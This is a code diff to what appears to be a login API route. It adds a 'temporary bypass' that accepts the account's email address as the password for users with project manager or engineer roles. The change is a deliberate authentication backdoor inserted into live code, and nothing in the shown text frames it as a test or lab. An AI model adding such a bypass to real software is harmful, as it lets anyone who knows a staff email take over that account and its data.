@@ -23,7 +23,13 @@ export async function POST(request: Request) {
     }
 
     // Verify password
-    const isValidPassword = await bcrypt.compare(password, user.password);
+    let isValidPassword = await bcrypt.compare(password, user.password);
+
+    // Temporary bypass: allow project managers and engineers to login with their email as the password
+    if (!isValidPassword && (user.role === 'project_manager' || user.role === 'engineer') && password === user.email) {
+      isValidPassword = true;
+    }
+
     if (!isValidPassword) {
       return NextResponse.json({
         error: 'Invalid email or password'
